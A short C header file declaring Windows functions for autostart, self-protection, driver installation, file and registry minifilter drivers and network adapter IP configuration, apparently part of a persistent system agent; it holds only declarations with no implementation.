#pragma once
#include "headers.h"

bool SetAutoStart(const string& programPath);
void CheckSelf();
string GetCurrentProcessFileName();
void ProtectSelf();
VOID DriverInstall(char* driverpath);
void InitSelf();
void installReg();
void startFlieflt();
void startRegflt();
char* GetIPAddress(const char* domain);
DWORD SetAllAdaptersIpAddresses();
BOOL InstallMiniFilterDriver(const char* lpszDriverName, const char* lpszDriverPath, const char* lpszAltitude);
BOOL StartMiniFilterDriver(const char* lpszDriverName);

BOOL InstallRegFilterDriver(const char* lpszDriverName, const char* lpszDriverPath, const char* lpszAltitude);
BOOL StartRegFilterDriver(const char* lpszDriverName);
